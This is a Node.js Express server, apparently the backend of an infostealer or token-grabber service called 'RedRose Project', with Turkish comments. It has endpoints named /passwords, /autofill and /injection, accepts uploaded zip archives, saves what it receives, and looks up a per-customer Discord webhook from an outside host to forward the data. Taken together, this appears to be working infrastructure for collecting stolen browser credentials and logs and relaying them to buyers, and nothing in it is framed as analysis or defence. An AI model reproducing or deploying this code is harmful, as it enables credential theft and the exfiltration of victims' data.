const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const fs = require("fs").promises;
const config = require('./config.json');
const multer = require('multer');
const bodyParser = require('body-parser');
const AdmZip = require('adm-zip');

const app = express();
const path = require('path');
const { WebhookClient } = require('discord.js');
const uploadFolder = 'Vct';

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });
app.use(bodyParser.json());

app.get('/', (req, res) => {
  res.json({
    status: true,
    message: "api work",
    apidev: "RedRose Project"
  });
});


app.use('/passwords', require('./Routes/passwords'));
app.use('/autofill', require('./Routes/autofill'));

app.use(express.json({limit: "900mb"}));
app.use(express.static('uploads'));

app.use(express.urlencoded({ extended: true }));
const errorlog = config.session.errorurl;
const injection = config.session.injection;

const webhookUrls = {
error: errorlog,
injection: injection
};

const webhookClients = {};
for (const key in webhookUrls) {
  webhookClients[key] = new WebhookClient({ url: webhookUrls[key] });
}


for (const key in webhookClients) {
  app.post(`/${key}`, async (req, res) => {
    const { body } = req;
    try {
      await webhookClients[key].send(body);
      res.sendStatus(200);
    } catch (error) {
      console.error(error);
      res.sendStatus(500);
    }
  });
}




app.post('/webhooks/:route', async (req, res) => {
  const route = req.params.route;
  const { key } = req.body;

  const { body } = req;

  const randomString = crypto.randomBytes(2).toString('hex');

  try {
const response = await axios.get(`https://bgg-7xht.onrender.com/keysorgu?key=${key}&api_auth=1295`);
    const webhookURL = response.data;

    if (!key) {
      return res.status(400).json({ message: 'dbde key bylunamad' });
    }

    if (!webhookURL) {
      return res.status(400).json({ message: 'No key provided in the form data' });
    }

    // Anahtar adıyla bir klasör oluştur
    const folderName = 'requests';
    const folderPath = path.join(__dirname, folderName);

    // Dosya varlığını kontrol et ve klasörü oluştur
    try {
      await fs.access(folderPath);
    } catch (error) {
      await fs.mkdir(folderPath);
    }

    const keyFolderName = path.join(folderPath, key);

    // Dosya varlığını kontrol et ve klasörü oluştur
    try {
      await fs.access(keyFolderName);
    } catch (error) {
      await fs.mkdir(keyFolderName);
    }

    // Rastgele string oluştur
    const fileName = `${randomString}.txt`;
    const filePath = path.join(keyFolderName, fileName);

    // İstek bilgilerini dosyaya yaz
    try {
      await fs.writeFile(filePath, JSON.stringify(req.body, null, 2));
      console.log('İstek başarıyla kaydedildi.');
    } catch (error) {
      console.error(error);
    }

    const webhookClient = new WebhookClient({ url: webhookURL });

    Promise.all([
      webhookClient.send(body)
    ])
      .then(() => {
        res.sendStatus(200);
      })
      .catch(error => {
        console.error(error);
        res.sendStatus(500);
      });
  } catch (error) {
    console.error(error);
    res.sendStatus(500);
  }
});


app.post('/upload', upload.single('file'), async (req, res) => {
  try {
    const key = req.body && req.body.json ? JSON.parse(req.body.json).key : null;

    if (!key) {
      return res.status(400).json({ message: 'No key provided in the form data' });
    }

    const randomString = crypto.randomBytes(2).toString('hex');

const response = await axios.get(`https://bgg-7xht.onrender.com/keysorgu?key=${key}&api_auth=1295`);

    const webhookURL = response.data;

    if (!webhookURL) {
      return res.status(500).json({ message: 'Error getting webhook URL' });
    }

    if (!req.file) {
      return res.status(400).json({ message: 'No file uploaded' });
    }

    const zipData = req.file.buffer;
    const zip = new AdmZip(zipData);
    const zipName = req.file.originalname;
    const zipNameWithRandom = `${randomString}_${zipName}`;

    const zipPath = path.join(uploadFolder, zipNameWithRandom);

    await fs.writeFile(zipPath, zipData);

    const webhookClient = new WebhookClient({ url: webhookURL });

    webhookClient.send({
      files: [{
        attachment: zipPath,
        name: zipName,
      }],
    });

   
    res.json({ message: 'File uploaded and extracted successfully' });
  } catch (error) {
          console.error(error);
    res.status(500).json({ message: 'Internal server error' });
  }
});

///
const routeMappings = require('./routeMappings.json');

app.get('/:route', async (req, res) => {
  const route = req.params.route;
 

  if (routeMappings.hasOwnProperty(route)) {
    res.sendFile(__dirname + routeMappings[route]);
  } else {
    res.status(404).send('Böyle sayfa yok');
  }
});


//

const PORT = process.env.PORT || 80;
app.listen(PORT)
  console.log(`Listening on port ${PORT}`);
